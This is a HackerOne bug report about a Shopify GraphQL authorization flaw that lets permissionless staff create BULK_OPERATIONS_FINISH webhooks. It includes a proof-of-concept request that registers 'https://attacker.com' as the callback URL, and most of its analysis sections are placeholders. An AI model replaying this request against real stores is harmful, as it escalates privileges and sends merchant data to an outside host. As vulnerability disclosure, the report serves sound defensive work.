# Staff  can use BULK_OPERATIONS_FINISH webhook topic using Graphql without permissions all

## Metadata
- **Source:** HackerOne
- **Report:** 1350095 | https://hackerone.com/reports/1350095
- **Submitted:** 2021-09-24
- **Reporter:** yinvi777
- **Program:** Unknown
- **Bounty:** $600
- **Severity:** medium
- **Vuln:** Privilege Escalation
- **CVEs:** None
- **Category:** web-api

## Summary
I am reporting this because it looks like an authorization bug in GraphQL.
A Staff member with no  permissions on a Shopify Store may be able to create Webhooks with the webhookSubscriptionCreate mutation on
BULK_OPERATIONS_FINISH webhook topic.

POST /admin/internal/web/graphql/core?operation=PageStaff HTTP/1.1
Host: yinvi-nacho-2.myshopify.com
Connection: close

{
"operationName": "webhookSubscr

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

I am reporting this because it looks like an authorization bug in GraphQL.
A Staff member with no  permissions on a Shopify Store may be able to create Webhooks with the webhookSubscriptionCreate mutation on
BULK_OPERATIONS_FINISH webhook topic.

POST /admin/internal/web/graphql/core?operation=PageStaff HTTP/1.1
Host: yinvi-nacho-2.myshopify.com
Connection: close

{
"operationName": "webhookSubscriptionCreate",
"variables": {
"topic": "BULK_OPERATIONS_FINISH",
"webhookSubscription": {
"callbackUrl": "https://attacker.com"
}
},
"query": "mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!) {\r\n  webhookSubscriptionCreate(topic: $topic, webhookSubscription: $webhookSubscription) {\r\n    userErrors {\r\n      field\r\n      message\r\n    }\r\n    webhookSubscription {\r\n      id\r\n    }\r\n  }\r\n}"
}

## Impact

Staff  with no permissions may be able to access or perform unauthorized actions  on  bulk-operation  https://shopify.dev/api/usage/bulk-operations/queries

</details>

---
*Analysed by Claude on 2026-05-24*
